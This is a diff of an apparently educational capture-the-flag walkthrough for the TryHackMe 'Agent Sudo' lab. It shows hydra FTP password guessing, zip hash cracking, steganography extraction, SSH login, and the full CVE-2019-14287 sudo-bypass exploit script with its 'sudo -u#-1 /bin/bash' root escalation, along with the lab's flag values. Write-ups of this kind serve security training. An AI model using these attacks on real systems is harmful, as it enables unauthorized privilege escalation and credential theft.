@@ -96,7 +96,7 @@ Nmap done: 1 IP address (1 host up) scanned in 12.08 seconds
 
 #
 > Password Guessing Using Hydra
-12. `hydra -l {USER AGENT'S NAME} -P {WORDLIST PATH} ftp://{TARGET IP}`
+12. `hydra -l {USER1} -P {WORDLIST PATH} ftp://{TARGET IP}`
 ```bash
 ┌──(kali㉿kali)-[~]
 └─$ hydra -l chris -P ~/Tools/wordlists/rockyou.txt ftp://10.10.55.185
@@ -112,19 +112,19 @@ Hydra (http://www.thc.org/thc-hydra) finished at 2023-07-01 14:02:54
 
 #
 > Scanning the Target's FTP Server
-13. `ftp {TARGET IP}`
+13. `ftp {USER1}@{TARGET IP}`
 ```bash
 ┌──(kali㉿kali)-[~]
-└─$ ftp 10.10.55.185
-Connected to 10.10.55.185.
+└─$ ftp chris@10.10.75.108 
+Connected to 10.10.75.108.
 220 (vsFTPd 3.0.3)
-Name (10.10.55.185:root): chris
 331 Please specify the password.
-Password:
+Password: 
 230 Login successful.
 Remote system type is UNIX.
 Using binary mode to transfer files.
 ftp> 
+
 ```
 14. `ls`
 15. `get {FILE1}`
@@ -187,7 +187,7 @@ All these alien like photos are fake! Agent R stored the real picture inside you
 From,
 Agent C
 ```
-21. `steghide --info {FILE1}`
+20. `steghide --info {FILE1}`
 ```bash
 ┌──(kali㉿kali)-[~]
 └─$ steghide --info cute-alien.jpg
@@ -198,8 +198,8 @@ Try to get information about embedded data ? (y/n) y
 Enter passphrase: 
 steghide: could not extract any data with that passphrase!
 ```
-20. `binwalk {FILE2}`
-21. `binwalk {FILE3}`
+21. `binwalk {FILE2}`
+22. `binwalk {FILE3}`
 ```bash
 ┌──(kali㉿kali)-[~]
 └─$ binwalk cute-alien.jpg
@@ -219,8 +219,8 @@ DECIMAL       HEXADECIMAL     DESCRIPTION
 34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
 34820         0x8804          End of Zip archive
 ```
-22. `binwalk {FILE3} --extract`
-23. `ls`
+23. `binwalk {FILE3} --extract`
+24. `ls`
 ```bash
 ┌──(kali㉿kali)-[~]
 └─$ binwalk cutie.png --extract
@@ -241,8 +241,8 @@ cutie-alien.jpg
 _cutie.png.extracted
 To_agentJ.txt
 ```
-24. `cd {EXTRACTED DIRECTORY}`
-25. `ls`
+25. `cd {EXTRACTED DIRECTORY}`
+26. `ls`
 ```bash
 ┌──(kali㉿kali)-[~]
 └─$ cd _cutie.png.extracted/
@@ -255,8 +255,8 @@ To_agentJ.txt
 8702.zip
 To_agentJtxt
 ```
-26. `zip2john {ZIP FILE} > {FILENAME2}.txt`
-27. `cat {FILENAME2}.txt`
+27. `zip2john {ZIP FILE} > {FILENAME2}.txt`
+28. `cat {FILENAME2}.txt`
 ```bash
 ┌──(kali㉿kali)-[~/_cutie.png.extracted]
 └─$ zip2john 8702.zip > Hash.txt
@@ -277,7 +277,7 @@ alien            (8702.zip/To_agentR.txt)
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed. 
 ```
-28. `7z e 8702.Ip`
+29. `7z e 8702.Ip`
 ```bash
 ┌──(kali㉿kali)-[~/_cutie.png.extracted]
 └─$ 7z e 8702.zip 
@@ -300,8 +300,8 @@ Everything is Ok
 Size:       86
 Compressed: 280
 ```
-29. `ls`
-30. `cat {FILE?}.txt`
+30. `ls`
+31. `cat {FILE4}.txt`
 ```bash
 ┌──(kali㉿kali)-[~/_cutie.png.extracted]
 └─$ ls
@@ -324,7 +324,7 @@ Agent R
 32. `steghide --info {FILE1}`
 33. `steghide --extract -sf {FILE1}`
 34. `ls`
-35. `cat {TEXT FILE}`
+35. `cat {FILE5}`
 ```bash
 ┌──(kali㉿kali)-[~/_cutie.png.extracted]
 └─$ echo 'QXJlYTUx' > String.txt
@@ -385,6 +385,220 @@ Don't ask me why the password look cheesy, ask agent R who set this password for
 
 Your buddy,
 chris
+```
+36. `ssh {USER2}@{TARGET IP}`
+```bash
+┌──(kali㉿kali)-[~]
+└─$ ssh james@10.10.75.108      
+james@10.10.75.108's password: 
+Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sat Jul  1 17:24:23 UTC 2023
+
+  System load:  0.0               Processes:           94
+  Usage of /:   39.7% of 9.78GB   Users logged in:     0
+  Memory usage: 15%               IP address for eth0: 10.10.75.108
+  Swap usage:   0%
+
+
+75 packages can be updated.
+33 updates are security updates.
+
+
+Last login: Tue Oct 29 14:26:27 2019
+```
+37. `ls`
+38. `cat {FILE6}.txt`
+```bash
+james@agent-sudo:~$ ls
+Alien_autospy.jpg  user_flag.txt
+```
+```bash
+james@agent-sudo:~$ cat user_flag.txt 
+b03d975e8c92a7c04146cfa7a5a313c7
+```
+39. `sudo scp {FILE7}:{FILE PATH} {DESTINATION PATH}` and reverse search it
+```bash
+┌──(kali㉿kali)-[/]
+└─$ sudo scp james@10.10.75.108:/home/james/Alien_autospy.jpg ~/ 
+The authenticity of host '10.10.75.108 (10.10.75.108)' can't be established.
+ED25519 key fingerprint is SHA256:rt6rNpPo1pGMkl4PRRE7NaQKAHV+UNkS9BfrCy8jVCA.
+This host key is known by the following other names/addresses:
+    ~/.ssh/known_hosts:2: [hashed name]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.75.108' (ED25519) to the list of known hosts.
+james@10.10.75.108's password: 
+Alien_autospy.jpg                                                                 100%   41KB 115.7KB/s   00:00   
+```
+
+![]()
+
+![]()
+
+40. `sudo -l`
+41. `sudo -v`
+```bash
+james@agent-sudo:~$ sudo -l
+[sudo] password for james: 
+Matching Defaults entries for james on agent-sudo:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User james may run the following commands on agent-sudo:
+    (ALL, !root) /bin/bash
+```
+```bash
+james@agent-sudo:~$ sudo -V
+Sudo version 1.8.21p2
+Sudoers policy plugin version 1.8.21p2
+Sudoers file grammar version 46
+Sudoers I/O plugin version 1.8.21p2
+```
+42. `searchsploit sudo 1.8.2`
+43. `curl "https://www.exploit-db.com/raw/{EXPLOIT FILE}"`
+```bash
+┌──(kali㉿kali)-[~]
+└─$ searchsploit --verbose sudo 1.8.2
+[i] Version ID: 1.8.2
+--------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                   |  Path
+--------------------------------------------------------------------------------- ---------------------------------
+sudo 1.8.0 < 1.8.3p1 - 'sudo_debug' glibc FORTIFY_SOURCE Bypass + Privilege Esca | linux/local/25134.c
+sudo 1.8.0 < 1.8.3p1 - Format String                                             | linux/dos/18436.txt
+Sudo 1.8.20 - 'get_process_ttyname()' Local Privilege Escalation                 | linux/local/42183.c
+Sudo 1.8.25p - 'pwfeedback' Buffer Overflow                                      | linux/local/48052.sh
+Sudo 1.8.25p - 'pwfeedback' Buffer Overflow (PoC)                                | linux/dos/47995.txt
+sudo 1.8.27 - Security Bypass                                                    | linux/local/47502.py
+--------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+```
+```bash
+┌──(kali㉿kali)-[~]
+└─$ curl https://www.exploit-db.com/raw/47502
+# Exploit Title : sudo 1.8.27 - Security Bypass
+# Date : 2019-10-15
+# Original Author: Joe Vennix
+# Exploit Author : Mohin Paramasivam (Shad0wQu35t)
+# Version : Sudo <1.8.28
+# Tested on Linux
+# Credit : Joe Vennix from Apple Information Security found and analyzed the bug
+# Fix : The bug is fixed in sudo 1.8.28
+# CVE : 2019-14287
+
+'''Check for the user sudo permissions
+
+sudo -l 
+
+User hacker may run the following commands on kali:
+    (ALL, !root) /bin/bash
+
+
+So user hacker can't run /bin/bash as root (!root)
+
+
+User hacker sudo privilege in /etc/sudoers
+
+# User privilege specification
+root    ALL=(ALL:ALL) ALL
+
+hacker ALL=(ALL,!root) /bin/bash
+
+
+With ALL specified, user hacker can run the binary /bin/bash as any user
+
+EXPLOIT: 
+
+sudo -u#-1 /bin/bash
+
+Example : 
+
+hacker@kali:~$ sudo -u#-1 /bin/bash
+root@kali:/home/hacker# id
+uid=0(root) gid=1000(hacker) groups=1000(hacker)
+root@kali:/home/hacker#
+
+Description :
+Sudo doesn't check for the existence of the specified user id and executes the with arbitrary user id with the sudo priv
+-u#-1 returns as 0 which is root's id
+
+and /bin/bash is executed with root permission
+Proof of Concept Code :
+
+How to use :
+python3 sudo_exploit.py
+
+'''
+
+
+#!/usr/bin/python3
+
+import os
+
+#Get current username
+
+username = input("Enter current username :")
+
+
+#check which binary the user can run with sudo
+
+os.system("sudo -l > priv")
+
+
+os.system("cat priv | grep 'ALL' | cut -d ')' -f 2 > binary")
+
+binary_file = open("binary")
+
+binary= binary_file.read()
+
+#execute sudo exploit
+
+print("Lets hope it works")
+
+os.system("sudo -u#-1 "+ binary)
+```
+44. `sudo -u#-1 /bin/bash`
+45. `whoami`
+```bash
+james@agent-sudo:~$ sudo -u#-1 /bin/bash
+root@agent-sudo:~#
+```
+```bash
+root@agent-sudo:~# whoami
+root
+```
+46. `find / -type f -name "root*" 2>/dev/null`
+47. `cat {ROOT FILE PATH}`
+```bash
+root@agent-sudo:~# find / -type f -name "root*" 2>/dev/null
+/lib/recovery-mode/options/root
+/usr/lib/python3/dist-packages/twisted/names/root.py
+/usr/lib/python3/dist-packages/twisted/names/__pycache__/root.cpython-36.pyc
+/usr/lib/python3/dist-packages/twisted/python/roots.py
+/usr/lib/python3/dist-packages/twisted/python/__pycache__/roots.cpython-36.pyc
+/usr/src/linux-headers-4.15.0-55/include/linux/root_dev.h
+/usr/share/dns/root.hints
+/usr/share/dns/root.key
+/usr/share/dns/root.ds
+/usr/share/apport/root_info_wrapper
+/root/root.txt
+/proc/sys/kernel/keys/root_maxbytes
+/proc/sys/kernel/keys/root_maxkeys
+```
+```bash
+root@agent-sudo:~# cat /root/root.txt
+To Mr.hacker,
+
+Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 
+
+Your flag is 
+b53a02f55b57d4439e3341834d70c062
+
+By,
+DesKel a.k.a Agent R
 ```
 
 # Vulnerability Identification
